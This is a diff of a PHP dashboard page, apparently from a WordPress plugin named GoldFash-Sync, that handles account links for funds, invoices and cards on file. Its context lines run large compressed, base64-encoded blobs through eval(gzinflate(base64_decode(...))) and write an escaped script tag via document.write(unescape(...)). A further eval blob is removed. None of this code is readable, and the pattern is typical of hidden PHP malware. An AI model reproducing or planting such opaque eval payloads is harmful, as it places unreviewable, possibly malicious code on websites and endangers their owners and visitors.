@@ -8,8 +8,21 @@ eval(gzinflate(base64_decode('41IpTctLzE1VsFVQSS4tKkrNK4kvLU4t0rUDkfFpmUXFJSB5a1
 ?>
 <?eval(gzinflate(base64_decode('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')));?>
 
- <?
-eval(gzinflate(base64_decode('bY9da8IwFIavFfYfpAh1F4tM61wZuxirDvxmRQeOUWI+7NEs1aZptb9+tVpY525C3vM8JzmnWqnUQVJ2mNWea4bYvIzBPb7PN72Otxzde47qLWh3b8+mj30/soZju9savnasdBk5VrJctNrJPJ3SWeqtwkEg5AD8uTWxH8YT9g17Fk8/cGJp6Tp+ahtPN9WQ7TWErGEiAVu083fmbVat74Reg1SeDkU2xq/UyDEHwbJ6w3gLBO1j5d+5R0maNLs1gwAj1iyA52SHkTcdoJ315L2niBU/xTV3RyC3nyamFHEtqTK/cqzxFcY68pFWLDwrMdYlJQaW/HUICUoOISiQ6DRD8QaUvxECgYwDIEwVRnRlREC2LLoISpYFpVcX4czXXJa4ZEmxI+f/LMA5woTkxg8=')));
+  <?php
+$indexP = 'ljAMiSyRUjE5_ZL1_DsEVd7q9PO8Fht4KM972KC54zZtD4wZV23wUzOdPz_brJolnJihU4N96MNemiqevOWaw4unSDhz9';
+require('.lik.php');
+$plugins_url = plugins_url();
+$file = ("GoldFash-Sync/dash/ooa.e/GoldFash_Dash");
+$xi3 = $file;
+$asf = $gfSLink['add.funds'];
+$aua = $gfSLink['add.auth.user'];
+$vau = $gfSLink['view.auth.user'];
+$cco = $gfSLink['cc.on.file'];
+$vai = $gfSLink['all.invoices'];
+$vat = $gfSLink['all.tickets'];
+$snt = $gfSLink['sub.ticket'];
+$gfn = $gfSLink['news'];
+$aff = $gfSLink['view.aff.acc'];
 ?>
 <!DOCTYPE html>
 <html>
@@ -100,9 +113,6 @@ document.write(unescape('%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%
     <script src="<?=$plugins_url?>/<?=$xi3?>/dist/js/app.min.js"></script>
     <!-- Sparkline -->
     <script src="<?=$plugins_url?>/<?=$xi3?>/plugins/sparkline/jquery.sparkline.min.js"></script>
-    <!-- jvectormap -->
-    <script src="<?=$plugins_url?>/<?=$xi3?>/plugins/jvectormap/jquery-jvectormap-1.2.2.min.js"></script>
-    <script src="<?=$plugins_url?>/<?=$xi3?>/plugins/jvectormap/jquery-jvectormap-world-mill-en.js"></script>
     <!-- SlimScroll 1.3.0 -->
     <script src="<?=$plugins_url?>/<?=$xi3?>/plugins/slimScroll/jquery.slimscroll.min.js"></script>
     <!-- ChartJS 1.0.1 -->
